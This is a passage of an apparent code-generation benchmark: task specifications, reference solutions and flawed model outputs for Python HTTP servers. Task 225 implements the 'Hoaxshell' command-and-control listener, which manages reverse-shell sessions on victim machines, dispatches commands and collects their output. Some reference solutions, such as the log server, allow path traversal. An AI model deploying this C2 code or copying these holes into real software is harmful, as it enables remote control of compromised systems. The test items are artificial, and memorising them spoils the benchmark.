    "Instruction": "Task Description: Create a Python class that implements a simple HTTP server to serve static files (CSS, JavaScript, and images) with proper content types and error handling.\n\nClass Description: PVEDiscordDarkServer is a class that creates an HTTP server to serve static web resources including CSS files, JavaScript files, and various image formats (PNG, JPG, JPEG, SVG). It handles different file types with appropriate content headers and provides error responses for missing files or unsupported requests.\n\nAttributes:\nPORT: int - The port number on which the HTTP server will run\nDIR_SASS: str - The directory path containing CSS files\nDIR_IMAGES: str - The directory path containing image files\nDIR_JS: str - The directory path containing JavaScript files\n\nMethods:\n__init__(port=3000) -> None - Initializes the server with the specified port (default: 3000) and sets up directory paths for static files\nrun() -> None - Starts the HTTP server and begins serving requests indefinitely until interrupted\nRequestHandler: class - Inner class that handles HTTP requests (inherits from BaseHTTPRequestHandler)\n    __init__(*args, **kwargs) -> None - Initializes the request handler with directory paths\n    log_message(format, *args) -> None - Overrides default logging to suppress log messages\n    _set_headers(status, type) -> None - Helper method to set HTTP response headers\n    do_GET() -> None - Handles GET requests, serves appropriate files with correct content types, or returns error responses",
    "Canonical_solution": "from http.server import HTTPServer, BaseHTTPRequestHandler\nimport json\nimport os\n\nclass PVEDiscordDarkServer:\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = os.path.join(os.path.dirname(__file__), \"sass\")\n        self.DIR_IMAGES = os.path.join(os.path.dirname(__file__), \"images\")\n        self.DIR_JS = os.path.join(os.path.dirname(__file__), \"js\")\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            self.DIR_SASS = kwargs.pop('DIR_SASS')\n            self.DIR_IMAGES = kwargs.pop('DIR_IMAGES')\n            self.DIR_JS = kwargs.pop('DIR_JS')\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            return\n\n        def _set_headers(self, status, type):\n            self.send_response(status)\n            self.send_header(\"Content-type\", type)\n            self.end_headers()\n\n        def do_GET(self):\n            status = 200\n            type = \"application/json\"\n            data = None\n\n            file = self.path.rpartition(\"/\")[2]\n            ext = file.rpartition(\".\")[2]\n\n            if ext == \"css\":\n                data = open(os.path.join(self.DIR_SASS, \"PVEDiscordDark.css\"), \"rb\").read()\n                type = \"text/css\"\n            elif ext == \"js\":\n                data = open(os.path.join(self.DIR_JS, \"PVEDiscordDark.js\"), \"rb\").read()\n                type = \"application/javascript\"\n            elif ext in (\"png\", \"jpg\", \"jpeg\"):\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/{ext}\"\n                except FileNotFoundError:\n                    status = 404\n            elif ext == \"svg\":\n                try:\n                    data = open(os.path.join(self.DIR_IMAGES, file), \"rb\").read()\n                    type = f\"image/svg+xml\"\n                except FileNotFoundError:\n                    status = 404\n            else:\n                status = 400\n            self._set_headers(status, type)\n            if status == 200:\n                self.wfile.write(data)\n            else:\n                self.wfile.write(json.dumps({\"error\": status}).encode())\n\n    def run(self):\n        print(f\"Serving on localhost:{self.PORT}\")\n        server = HTTPServer(\n            server_address=(\"\", self.PORT),\n            RequestHandlerClass=lambda *args, **kwargs: self.RequestHandler(\n                *args,\n                DIR_SASS=self.DIR_SASS,\n                DIR_IMAGES=self.DIR_IMAGES,\n                DIR_JS=self.DIR_JS,\n                **kwargs\n            )\n        )\n        try:\n            server.serve_forever()\n        except KeyboardInterrupt:\n            quit()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nfrom os import path\nfrom urllib.parse import unquote\nimport mimetypes\n\nclass PVEDiscordDarkServer(HTTPServer):\n    def __init__(self, port=3000):\n        self.PORT = port\n        self.DIR_SASS = 'static/css'\n        self.DIR_IMAGES = 'static/images'\n        self.DIR_JS = 'static/js'\n        super().__init__(('localhost', self.PORT), self.RequestHandler)\n\n    def run(self):\n        print(f'Starting server on port {self.PORT}...')\n        super().serve_forever()\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def __init__(self, *args, **kwargs):\n            self.DIR_SASS = kwargs.pop('DIR_SASS')\n            self.DIR_IMAGES = kwargs.pop('DIR_IMAGES')\n            self.DIR_JS = kwargs.pop('DIR_JS')\n            super().__init__(*args, **kwargs)\n\n        def log_message(self, format, *args):\n            pass\n\n        def _set_headers(self, status, type):\n            self.send_response(status)\n            self.send_header('Content-type', type)\n            self.end_headers()\n\n        def do_GET(self):\n            url = unquote(self.path)\n            if url == '/':\n                url = '/index.html'\n            if url.startswith('/static/'):\n                url = url[7:]\n            if url.startswith('css/'):\n                file_path = path.join(self.DIR_SASS, url[4:])\n            elif url.startswith('images/'):\n                file_path = path.join(self.DIR_IMAGES, url[7:])\n            elif url.startswith('js/'):\n                file_path = path.join(self.DIR_JS, url[3:])\n            else:\n                self._set_headers(404, 'text/html')\n                self.wfile.write(b'404 Not Found')\n                return\n\n            if not path.exists(file_path):\n                self._set_headers(404, 'text/html')\n                self.wfile.write(b'404 Not Found')\n                return\n\n            content_type, _ = mimetypes.guess_type(file_path)\n            if content_type is None:\n                content_type = 'application/octet-stream'\n            self._set_headers(200, content_type)\n\n            with open(file_path, 'rb') as f:\n                self.wfile.write(f.read())\n```\n"
  },
  {
    "Task_id": 224,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server for sharing and viewing log files from a specified directory. The server should handle GET requests to display available log files and serve their contents.\n\nClass Description: The LogServer class creates an HTTP server that serves log files from a specified directory. It uses a custom request handler (LogSharedHandler) to process HTTP requests and serve either a directory listing or file contents.\n\nAttributes:\n- log_path: str - The directory path where log files are stored\n- port: int - The port number on which the HTTP server will listen\n- httpd: Optional[HTTPServer] - The HTTP server instance (None until started)\n\nMethods:\n- __init__(log_path: str, port: int) -> None - Initializes the LogServer with the specified log directory path and port number\n- start() -> None - Starts the HTTP server on 0.0.0.0 (all interfaces) using the specified port and serves requests indefinitely\n\nThe LogSharedHandler (inner class) handles HTTP requests with these methods:\n- do_GET() -> None - Processes GET requests:\n  - For root path (\"/\"), returns an HTML page listing all available log files as clickable links\n  - For specific file paths, returns the content of the requested log file\n  - Returns 404 if requested file doesn't exist",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\nimport os\nfrom typing import Optional\n\nclass LogSharedHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        log_path = os.getenv('LOG_PATH')\n        if self.path == \"/\":\n            html = \"<html><body>\"\n            for f in os.listdir(log_path):\n                html += f\"<p><a href=\\\"{f}\\\">{f}</a></p>\"\n            html += \"</body></html>\"\n\n            self.send_response(200)\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(html.encode())\n        else:\n            p = log_path + self.path\n            try:\n                with open(p, \"rb\") as file:\n                    self.send_response(200)\n                    self.send_header(\"Content-type\", \"text/plain\")\n                    self.end_headers()\n                    self.wfile.write(file.read())\n            except FileNotFoundError:\n                self.send_error(404, \"File not found\")\n\nclass LogServer:\n    def __init__(self, log_path: str, port: int):\n        self.log_path = log_path\n        self.port = port\n        self.httpd: Optional[HTTPServer] = None\n\n    def start(self):\n        self.httpd = HTTPServer(('0.0.0.0', self.port), LogSharedHandler)\n        self.httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nfrom http.server import HTTPServer, SimpleHTTPRequestHandler\nimport os\n\nclass LogServer:\n    def __init__(self, log_path: str, port: int) -> None:\n        self.log_path = log_path\n        self.port = port\n        self.httpd = None\n\n    def start(self) -> None:\n        handler = type('LogSharedHandler', (LogSharedHandler,), {'log_path': self.log_path})\n        self.httpd = HTTPServer(('0.0.0.0', self.port), handler)\n        print(f'Starting server on port {self.port}...')\n        self.httpd.serve_forever()\n\nclass LogSharedHandler(SimpleHTTPRequestHandler):\n    def log_message(self, format, *args):\n        return\n\n    def do_GET(self) -> None:\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(b'<html><body><h1>Available log files:</h1>')\n            for file in os.listdir(self.log_path):\n                if file.endswith('.log'):\n                    self.wfile.write(f'<a href=\"{file}\">{file}</a><br>'.encode())\n            self.wfile.write(b'</body></html>')\n        else:\n            file_path = os.path.join(self.log_path, self.path.strip('/'))\n            if os.path.exists(file_path):\n                self.send_response(200)\n                self.send_header('Content-type', 'text/plain')\n                self.end_headers()\n                with open(file_path, 'rb') as f:\n                    self.wfile.write(f.read())\n            else:\n                self.send_response(404)\n                self.send_header('Content-type', 'text/plain')\n                self.end_headers()\n                self.wfile.write(b'File not found')\n```"
  },
  {
    "Task_id": 225,
    "Instruction": "Task Description: Create a custom HTTP server class that handles GET, POST, and OPTIONS requests for managing shell sessions, including session verification, command execution, and response handling.\n\nClass Description: Hoaxshell is a custom HTTP request handler that extends BaseHTTPRequestHandler to manage reverse shell sessions. It handles session establishment, command execution, and response collection while maintaining session state.\n\nAttributes:\n- server_name: [str] - Name identifier for the server\n- header_id: [str] - Custom header identifier for session tracking\n- server_unique_id: [str] - Unique identifier for the server instance\n- command_pool: [dict] - Pool of commands to be executed per session\n\nMethods:\n- do_GET([self]) -> None - Handles GET requests for session verification and command retrieval\n- do_POST([self]) -> None - Handles POST requests for command output submission\n- do_OPTIONS([self]) -> None - Handles OPTIONS requests for CORS preflight\n- log_message([self, format, *args]) -> None - Overrides default logging to suppress messages\n- initiate_hoax_server() -> None - Static method to start the HTTP server with optional SSL support\n\nThe class interacts with session management components and implements custom request handling for shell session management, including session verification, command distribution, and response collection. It supports both HTTP and HTTPS modes with configurable ports and SSL certificates.",
    "Canonical_solution": "```python\nfrom http.server import HTTPServer, BaseHTTPRequestHandler\nimport ssl\n\nclass Hoaxshell(BaseHTTPRequestHandler):\n    server_name = 'Hoaxshell Multi-Handler'\n    header_id = None\n    server_unique_id = None\n    command_pool = {}\n\n    def do_GET(self):\n        timestamp = int(datetime.now().timestamp())\n        \n        if not self.header_id:\n            header_id_extract = [header.replace(\"X-\", \"\") for header in self.headers.keys() if re.match(\"X-[a-z0-9]{4}-[a-z0-9]{4}\", header)]\n            self.header_id = f'X-{header_id_extract[0]}'\n\n        try:\n            session_id = self.headers.get(self.header_id)\n        except:\n            session_id = None\n\n        if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):\n            if session_id in Sessions_Manager.legit_session_ids.keys():\n                h = session_id.split('-')\n                Sessions_Manager.verify.append(h[0])\n                Sessions_Manager.get_cmd.append(h[1])\n                Sessions_Manager.post_res.append(h[2])\n\n                Sessions_Manager.active_sessions[session_id] = {\n                    'IP Address': self.client_address[0],\n                    'Port': self.client_address[1],\n                    'execution_verified': False,\n                    'Status': 'Active',\n                    'last_received': timestamp,\n                    'OS Type': Sessions_Manager.legit_session_ids[session_id]['OS Type'],\n                    'frequency': Sessions_Manager.legit_session_ids[session_id]['frequency'],\n                    'Owner': self.server_unique_id,\n                    'self_owned': True,\n                    'aliased': False,\n                    'alias': None,\n                    'Listener': 'hoaxshell',\n                    'Shell': Sessions_Manager.legit_session_ids[session_id]['Shell'],\n                    'iface': Sessions_Manager.legit_session_ids[session_id]['iface'],\n                    'prompt': None,\n                    'Stability': 'Unstable'\n                }\n                self.command_pool[session_id] = []\n\n        elif session_id and (session_id in Sessions_Manager.active_sessions.keys()):\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        session_id = self.headers.get(self.header_id)\n        legit = True if session_id in Sessions_Manager.legit_session_ids.keys() else False\n\n        url_split = self.path.strip(\"/\").split(\"/\")\n\n        if (url_split[0] in Sessions_Manager.verify and legit) or \\\n           (legit and session_id in Sessions_Manager.active_sessions and not Sessions_Manager.active_sessions[session_id]['execution_verified']):\n            \n            if Sessions_Manager.active_sessions[session_id]['execution_verified']:\n                print_to_prompt(f'\\r[{INFO}] Received \"Verify execution\" request from an already established session (ignored).')\n                return\n\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n            self.wfile.write(bytes('OK', \"utf-8\"))\n            Sessions_Manager.active_sessions[session_id]['execution_verified'] = True\n\n            try:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]\n                Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()}.')\n\n            except IndexError:\n                Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'\n                Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'\n                print_to_prompt(f'\\r[{GREEN}Shell{END}] {session_id} - New session established -> {ORANGE}{self.client_address[0]}{END} at {get_datetime()} (hostname and user undefined).')\n\n            try:\n                Thread(target=self.monitor_shell_state, args=(session_id,), name=f'session_state_monitor_{self.client_address[0]}', daemon=True).start()\n            except:\n                pass\n\n            new_session_data = deepcopy(Sessions_Manager.active_sessions[session_id])\n            new_session_data['session_id'] = session_id\n            new_session_data['alias'] = None\n            new_session_data['aliased'] = False\n            new_session_data['self_owned'] = False\n            Core_Server.announce_new_session(new_session_data)\n            del new_session_data\n\n        elif self.path.strip(\"/\") in Sessions_Manager.get_cmd and legit:\n            self.send_response(200)\n            self.send_header('Content-type', 'text/javascript; charset=UTF-8')\n            self.send_header('Access-Control-Allow-Origin', '*')\n            self.end_headers()\n\n            if len(self.command_pool[session_id]):\n                cmd = self.command_pool[session_id].pop(0)\n                if isinstance(cmd, dict):\n                    cmd = cmd['data']\n                self.wfile.write(bytes(cmd, 'utf-8'))\n            else:\n                self.wfile.write(bytes('None', 'utf-8'))\n\n            Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n            return\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'')\n\n    def do_POST(self):\n        timestamp = int(datetime.now().timestamp())\n        session_id = self.headers.get(self.header_id)\n        legit = True if (session_id in Sessions_Manager.legit_session_ids.keys()) else False\n\n        if legit:\n            try:\n                Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp\n                self.server_version = Hoaxshell_Settings.server_version\n                self.sys_version = \"\"\n\n                if self.path.strip(\"/\") in Sessions_Manager.post_res and legit and \\\n                   session_id in Sessions_Manager.active_sessions.keys():\n                    \n                    try:\n                        self.send_response(200)\n                        self.send_header('Content-Type', 'text/plain')\n                        self.end_headers()\n                        self.wfile.write(b'OK')\n                        content_len = int(self.headers.get('Content-Length'))\n                        output = None\n                        output = self.rfile.read(content_len)\n                        output = self.cmd_output_interpreter(session_id, output, constraint_mode=Sessions_Manager.legit_session_ids[session_id]['constraint_mode'])\n                        \n                        if not isinstance(output, int):\n                            if isinstance(output, str):\n                                if re.search(\"The term 'OK' is not recognized as the name of a cmdlet, function, script file\", output) or re.search('bash: line 1: OK: command not found', output):\n                                    return\n                                print(f'\\r{GREEN}{output}{END}') if output else do_nothing()\n                                print()\n                                Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                            elif isinstance(output, list):\n                                if not isinstance(output[1], int):\n                                    try:\n                                        Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', '', session_id, True], 'command_output', 30)\n                                    except:\n                                        pass\n\n                    except ConnectionResetError:\n                        error_msg = f'[{ERR}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get(\"Content-Length\")}). Try limiting the command\\'s output.'\n                        if isinstance(output, str):\n                            print(error_msg)\n                            Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()\n                        elif isinstance(output, list):\n                            try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, '', session_id, True], 'command_output', 30)\n                            except: pass\n                        del error_msg\n\n                    finally:\n                        del output\n\n            except KeyError:\n                pass\n\n        else:\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Move on mate.')\n\n    def do_OPTIONS(self):\n        self.server_version = Hoaxshell_Settings.server_version\n        self.sys_version = \"\"\n        self.send_response(200)\n        self.send_header('Access-Control-Allow-Origin', self.headers[\"Origin\"])\n        self.send_header('Vary', \"Origin\")\n        self.send_header('Access-Control-Allow-Credentials', 'true')\n        self.send_header('Access-Control-Allow-Headers', Hoaxshell_Settings.header_id)\n        self.end_headers()\n        self.wfile.write(b'OK')\n\n    def log_message(self, format, *args):\n        return\n\ndef initiate_hoax_server():\n    try:\n        if (Hoaxshell_Settings.certfile and not Hoaxshell_Settings.keyfile) or \\\n           (Hoaxshell_Settings.keyfile and not Hoaxshell_Settings.certfile):\n            exit(f'[{DEBUG}] SSL support seems to be misconfigured (missing key or cert file).')\n\n        port = Hoaxshell_Settings.bind_port if not Hoaxshell_Settings.ssl_support else Hoaxshell_Settings.bind_port_ssl\n\n        try:\n            httpd = HTTPServer((Hoaxshell_Settings.bind_address, port), Hoaxshell)\n        except OSError:\n            exit(f'[{DEBUG}] {Hoaxshell.server_name} failed to start. Port {port} seems to already be in use.\\n')\n        except:\n            exit(f'\\n[{DEBUG}] {Hoaxshell.server_name} failed to start (Unknown error occurred).\\n')\n\n        if Hoaxshell_Settings.ssl_support:\n            context = ssl.SSLContext(ssl.PROTOCOL_TLS)\n            context.load_cert_chain(certfile=Hoaxshell_Settings.certfile, keyfile=Hoaxshell_Settings.keyfile)\n            httpd.socket = context.wrap_socket(sock=httpd.socket, server_side=True)\n\n        Hoaxshell_server = Thread(target=httpd.serve_forever, args=(), name='hoaxshell_server')\n        Hoaxshell_server.daemon = True\n        Hoaxshell_server.start()\n        registered_services.append({\n            'service': Hoaxshell.server_name,\n            'socket': f'{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}'\n        })\n        print(f'[{ORANGE}{Hoaxshell_Settings.bind_address}{END}:{ORANGE}{port}{END}]::{Hoaxshell.server_name}')\n\n    except KeyboardInterrupt:\n        Hoaxshell.terminate()\n```",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\nimport ssl\nimport json\nimport subprocess\nimport os\n\nclass Hoaxshell(http.server.BaseHTTPRequestHandler):\n    server_name = \"Hoaxshell\"\n    header_id = \"Hoaxshell-Session\"\n    server_unique_id = \"Hoaxshell-Server-Unique-ID\"\n    command_pool = {}\n\n    def do_GET(self):\n        if self.headers.get(self.header_id):\n            session_id = self.headers.get(self.header_id)\n            if session_id in self.command_pool:\n                command = self.command_pool[session_id]\n                del self.command_pool[session_id]\n                self.send_response(200)\n                self.send_header(\"Content-type\", \"text/html\")\n                self.end_headers()\n                self.wfile.write(command.encode())\n            else:\n                self.send_response(404)\n                self.send_header(\"Content-type\", \"text/html\")\n                self.end_headers()\n                self.wfile.write(b\"No command available\")\n        else:\n            self.send_response(401)\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(b\"Unauthorized\")\n\n    def do_POST(self):\n        content_length = int(self.headers['Content-Length'])\n        post_data = self.rfile.read(content_length)\n        data = json.loads(post_data.decode('utf-8'))\n        session_id = data.get(self.header_id)\n        if session_id:\n            output = data.get(\"output\")\n            if output:\n                self.send_response(200)\n                self.send_header(\"Content-type\", \"text/html\")\n                self.end_headers()\n                self.wfile.write(b\"Command output received\")\n            else:\n                self.send_response(400)\n                self.send_header(\"Content-type\", \"text/html\")\n                self.end_headers()\n                self.wfile.write(b\"Invalid command output\")\n        else:\n            self.send_response(401)\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(b\"Unauthorized\")\n\n    def do_OPTIONS(self):\n        self.send_response(200)\n        self.send_header(\"Access-Control-Allow-Origin\", \"*\")\n        self.send_header(\"Access-Control-Allow-Methods\", \"GET, POST, OPTIONS\")\n        self.send_header(\"Access-Control-Allow-Headers\", \"Content-Type\")\n        self.end_headers()\n\n    def log_message(self, format, *args):\n        pass\n\n    @staticmethod\n    def initiate_hoax_server(ssl_cert=None, ssl_key=None, port=8080):\n        if ssl_cert and ssl_key:\n            httpd = socketserver.TCPServer((\"\", port), Hoaxshell)\n            httpd.socket = ssl.wrap_socket(httpd.socket, certfile=ssl_cert, keyfile=ssl_key, server_side=True)\n        else:\n            httpd = socketserver.TCPServer((\"\", port), Hoaxshell)\n        httpd.serve_forever()\n```\n"
  },
  {
    "Task_id": 227,
    "Instruction": "Task Description: Create a Python class that implements an HTTP server to serve static files and render dynamic content from a profile file, with optional browser auto-launch functionality.\n\nClass Description: ProfileHTTPServer is a class that creates and manages an HTTP server to serve both static files from a 'web' directory and dynamically rendered content from profile data. It handles port selection, profile data reading, and optional browser launching.\n\nAttributes:\nprof_filename: str - The filename of the profile to be read and served\nstart_browser: bool - Flag indicating whether to automatically open a browser tab\nport: Optional[int] - The port number to use for the server (None for auto-selection)\ndata: Any - The profile data read from the file\n\nMethods:\n__init__(prof_filename: str, start_browser: bool = False, port: Optional[int] = None) -> None - Initializes the server with profile filename, browser flag, and optional port\n_read_profile() -> Any - Reads and returns profile data from the specified file\n_is_port_in_use(port: int) -> bool - Checks if a port is already in use\nstart() -> None - Starts the HTTP server on the selected port, optionally launching a browser\n\nStaticServer (nested class):\n__init__(data: Any, prof_filename: str, *args, **kwargs) -> None - Initializes the request handler with profile data and filename\ndo_GET() -> None - Handles GET requests, serving either static files or rendered HTML\n_render() -> str - Renders the HTML template with profile data and version information",
    "Canonical_solution": "import html\nimport json\nimport mimetypes\nimport socket\nimport threading\nimport webbrowser\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\nfrom pathlib import Path\nfrom typing import Optional\n\nclass StaticServer(BaseHTTPRequestHandler):\n    def __init__(self, data, prof_filename, *args, **kwargs):\n        self.data = data\n        self.prof_filename = prof_filename\n        super().__init__(*args, **kwargs)\n\n    def do_GET(self):\n        self.send_response(200)\n\n        if self.path == \"/\":\n            self.send_header(\"Content-type\", \"text/html\")\n            self.end_headers()\n            self.wfile.write(self._render().encode())\n        else:\n            this_dir = Path(__file__).resolve().parent\n            filepath = this_dir / \"web\" / self.path[1:]\n\n            mimetype, _ = mimetypes.guess_type(str(filepath))\n            assert mimetype is not None\n            self.send_header(\"Content-type\", mimetype)\n            self.end_headers()\n\n            with open(filepath, \"rb\") as fh:\n                content = fh.read()\n            self.wfile.write(content)\n\n    def _render(self):\n        this_dir = Path(__file__).resolve().parent\n        with open(this_dir / \"web\" / \"index.html\", encoding=\"utf-8\") as _file:\n            template = string.Template(_file.read())\n\n        return template.substitute(\n            data=html.escape(json.dumps(self.data).replace(\"</\", \"<\\\\/\")),\n            version=html.escape(__version__),\n            filename=html.escape(self.prof_filename.replace(\"</\", \"<\\\\/\")),\n        )\n\nclass ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: Optional[int] = None):\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self):\n        try:\n            return read_import_profile(self.prof_filename)\n        except (TunaError, StopIteration):\n            pass\n        return read_runtime_profile(self.prof_filename)\n\n    def _is_port_in_use(self, port: int) -> bool:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            return s.connect_ex((\"localhost\", port)) == 0\n\n    def start(self):\n        if self.port is None:\n            self.port = 8000\n            while self._is_port_in_use(self.port):\n                self.port += 1\n\n        handler = lambda *args: StaticServer(self.data, self.prof_filename, *args)\n        httpd = HTTPServer((\"\", self.port), handler)\n\n        if self.start_browser:\n            address = f\"http://localhost:{self.port}\"\n            threading.Thread(target=lambda: webbrowser.open_new_tab(address)).start()\n\n        print(f\"Starting httpd on port {self.port}\")\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nfrom http.server import HTTPServer, SimpleHTTPRequestHandler\nfrom socketserver import ThreadingMixIn\nimport threading\nimport webbrowser\nimport os\nimport socket\n\nclass ProfileHTTPServer:\n    def __init__(self, prof_filename: str, start_browser: bool = False, port: Optional[int] = None):\n        self.prof_filename = prof_filename\n        self.start_browser = start_browser\n        self.port = port\n        self.data = self._read_profile()\n\n    def _read_profile(self) -> Any:\n        with open(self.prof_filename, 'r') as f:\n            return f.read()\n\n    def _is_port_in_use(self, port: int) -> bool:\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            return s.connect_ex(('localhost', port)) == 0\n\n    def start(self) -> None:\n        if self.port is None:\n            self.port = 8000\n            while self._is_port_in_use(self.port):\n                self.port += 1\n        server_address = ('', self.port)\n        httpd = ThreadingHTTPServer(server_address, ProfileHTTPRequestHandler(self.data, self.prof_filename))\n        print(f'Starting server on port {self.port}')\n        if self.start_browser:\n            webbrowser.open(f'http://localhost:{self.port}')\n        httpd.serve_forever()\n\nclass ProfileHTTPRequestHandler(SimpleHTTPRequestHandler):\n    def __init__(self, data: Any, prof_filename: str, *args, **kwargs):\n        self.data = data\n        self.prof_filename = prof_filename\n        super().__init__(*args, **kwargs)\n\n    def do_GET(self) -> None:\n        if self.path == '/':\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n            self.wfile.write(self._render().encode('utf-8'))\n        else:\n            super().do_GET()\n\n    def _render(self) -> str:\n        with open('template.html', 'r') as f:\n            template = f.read()\n        version = os.popen('git describe --tags').read().strip()\n        return template.format(data=self.data, version=version)\n\nclass ThreadingHTTPServer(ThreadingMixIn, HTTPServer):\n    pass\n```"
  },
  {
    "Task_id": 228,
    "Instruction": "Task Description: Create a custom HTTP server in Python that can serve content and be stopped after handling a single GET request.\n\nClass Description: This implementation consists of two classes: HttpRequestHandler (handles HTTP requests) and HttpServer (manages server operations). The server serves specified content when receiving a GET request and then stops itself.\n\nAttributes:\n\nAttribute1: stop [bool] - Flag indicating whether the server should stop running\nAttribute2: content [bytes] - The content to be served in response to GET requests\n\nMethods:\n\nMethod1: do_GET(self) -> None - Handles GET requests by sending a 200 response with the server's content and setting the stop flag\nMethod2: log_message(self, format, *args) -> None - Overrides default logging to suppress log messages\nMethod3: serve_forever(self, content) -> None - Starts the server with the given content and runs until a request is handled (stop flag is set)",
    "Canonical_solution": "import socket\nimport threading\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass HttpRequestHandler(BaseHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.send_header(\"Content-type\", \"text/html\")\n        self.end_headers()\n        self.wfile.write(self.server.content)\n        self.server.stop = True\n\n    def log_message(self, format, *args):\n        return\n\nclass HttpServer(HTTPServer):\n    def serve_forever(self, content):\n        self.stop = False\n        self.content = content\n        while not self.stop:\n            self.handle_request()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
    "wrong_result": "```python\nimport http.server\nimport socketserver\n\nclass HttpRequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        self.send_response(200)\n        self.end_headers()\n        self.wfile.write(self.server.content)\n        self.server.stop = True\n\n    def log_message(self, format, *args):\n        pass\n\nclass HttpServer(socketserver.TCPServer):\n    def __init__(self, server_address, RequestHandlerClass, bind_and_activate=True, content=b''):\n        super().__init__(server_address, RequestHandlerClass, bind_and_activate)\n        self.content = content\n        self.stop = False\n\n    def serve_forever(self):\n        while not self.stop:\n            self.handle_request()\n\nif __name__ == '__main__':\n    content = b'Hello, World!'\n    server = HttpServer(('', 8000), HttpRequestHandler, content=content)\n    server.serve_forever()\n```\n"
  },
  {
    "Task_id": 229,
    "Instruction": "Task Description: Create a simple HTTP server in Python that can handle GET, HEAD, and POST requests, with customizable port configuration.\n\nClass Description: SimpleHTTPServer is a class that implements a basic HTTP server capable of processing GET, HEAD, and POST requests. It includes an inner RequestHandler class that manages the actual request processing and response generation.\n\nAttributes:\n- port: int - The port number on which the server will listen (default: 8080)\n- server_address: tuple - A tuple containing the server address and port (default: ('', port))\n- handler_class: class - The request handler class that processes HTTP requests\n\nMethods:\n- __init__(port: int = 8080) -> None - Initializes the server with the specified port\n- run() -> None - Starts the HTTP server and begins serving requests indefinitely\n- RequestHandler._set_headers() -> None - Sets basic HTTP response headers (200 status and text/html content type)\n- RequestHandler.do_GET() -> None - Handles HTTP GET requests\n- RequestHandler.do_HEAD() -> None - Handles HTTP HEAD requests\n- RequestHandler.do_POST() -> None - Handles HTTP POST requests, reading and printing the posted data",
    "Canonical_solution": "from http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass SimpleHTTPServer:\n    def __init__(self, port=8080):\n        self.port = port\n        self.server_address = ('', self.port)\n        self.handler_class = self.RequestHandler\n\n    class RequestHandler(BaseHTTPRequestHandler):\n        def _set_headers(self):\n            self.send_response(200)\n            self.send_header('Content-type', 'text/html')\n            self.end_headers()\n\n        def do_GET(self):\n            self._set_headers()\n\n        def do_HEAD(self):\n            self._set_headers()\n\n        def do_POST(self):\n            content_length = int(self.headers['Content-Length'])\n            post_data = self.rfile.read(content_length)\n            self._set_headers()\n            print(post_data)\n\n    def run(self):\n        httpd = HTTPServer(self.server_address, self.handler_class)\n        print('Starting httpd...')\n        httpd.serve_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 55,
